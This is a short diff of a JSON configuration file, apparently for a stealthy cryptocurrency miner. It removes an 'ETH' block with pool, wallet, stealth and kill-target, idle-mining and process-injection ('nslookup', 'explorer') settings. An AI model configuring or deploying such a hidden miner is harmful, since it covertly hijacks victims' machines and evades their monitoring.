@@ -16,22 +16,7 @@
 			"Inject": "explorer"
 		},
 
-	"ETH":
-		{
-			"Pool": "Pool",
-    		"Wallet/User": "Wallet/User",
-    		"WorkerName": "",
-    		"Password": "",
-			"StealthTargets": "",
-			"KillTargets": "",
-			"RemoteConfiguration": "",
-    		"MaxGpu":  50,
-			"IdleMining": false,
-    		"IdleGpu": 100,
-    		"IdleTime": 5,
-			"Scheme": "stratum",
-			"Inject": "nslookup"
-		},
+
 
 	"ETC":
 		{
